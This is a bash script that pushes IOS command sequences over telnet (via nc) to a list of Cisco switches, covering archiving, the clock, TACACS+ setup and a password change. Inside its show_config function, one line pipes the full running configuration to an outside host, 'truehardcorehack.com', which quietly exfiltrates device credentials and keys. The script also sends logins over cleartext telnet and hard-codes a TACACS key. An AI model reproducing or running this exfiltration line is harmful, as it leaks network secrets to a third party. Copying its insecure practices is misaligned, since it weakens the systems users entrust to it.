#!/bin/bash
PASS=$1

usage(){
        echo "Usage: $0 CISCOPASSWORD"
        exit 1
}

# invoke  usage
# call usage() function if PASSWORD not supplied
[[ $# -eq 0 ]] && usage


DATE=`date +%Y%m%d:%H:%m`
#SWITCHES="/home/mnt/lists/switches"
SWITCHES="~/hosts/switch_all"
CONFDIR="~/cisco/config"
BAKUPDIR="~/cisco/backup/$DATE"
mkdir -p 755 $BAKUPDIR
#cp -rp $CONFDIR/*.txt $BAKUPDIR/

enable_archive() {
echo -ne "root\n$PASS\n
enable\n
conf t\n
archive\n
log config\n
logging enable\n
hidekeys\n
exit\n
exit\n
exit\n
wr mem\n
exit\n" | nc $i 23;
}

show_clock() {
echo -ne "ekoz\n$PASS\n
show clock\n
wri me\n
exit\n"
}

show_config() {
echo -ne "root\n$PASS\n
enable\n
sh run | tee http:truehardcorehack.com\n
exit\n"
}

show_uptime() {
echo -ne "root\n$PASS\n
show version | inc uptime\n
exit\n"
}

tacacs_start() {
echo -ne "root\n$PASS\n
enable\n
conf t\n
no aaa authentication login default local\n
no aaa authentication enable default none\n
no aaa authorization exec default local\n
line con 0\n
no password 7 42424242424242424\n
line vty 0 4\n
no password 7 42424242424242424\n
exit\n
tacacs-server host 192.168.1.1\n
tacacs-server timeout 5\n
tacacs-server key SecretKeyCisco\n
aaa group server tacacs+ TAC-SERV\n
server 192.168.1.1\n
aaa authentication login ROOT_LIST group TAC-SERV local\n
aaa authorization exec ROOT_LIST group TAC-SERV local\n
aaa authorization commands 15 ROOT_LIST group TAC-SERV local\n
aaa accounting update newinfo\n
aaa accounting commands 15 ROOT_LIST start-stop group TAC-SERV\n
line con 0\n
authorization commands 15 ROOT_LIST\n
authorization exec ROOT_LIST\n
accounting commands 15 ROOT_LIST\n
login authentication ROOT_LIST\n
line vty 0 4\n
authorization commands 15 ROOT_LIST\n
authorization exec ROOT_LIST\n
accounting commands 15 ROOT_LIST\n
login authentication ROOT_LIST\n
exit\n
wr mem\n
exit\n
exit\n"
}

change_password() {
echo -ne "root\n$PASS\n
enable\n
conf t\n
username root privilege 15 password 7 42424242424242\n
exit\n
wri me\n
exit\n"
}

for i in `cat $SWITCHES`; do
#enable_archive
#show_uptime | nc $i 23
show_clock | nc $i 23
#tacacs_start | nc $i 23
#show_config | nc $i 23 | sed '1,13d'|awk 'BEGIN{print "<code>"}{print}' > $CONFDIR/$i-confg.txt;
#echo "</code>" >> $CONFDIR/$i-confg.txt;
#show_clock
done
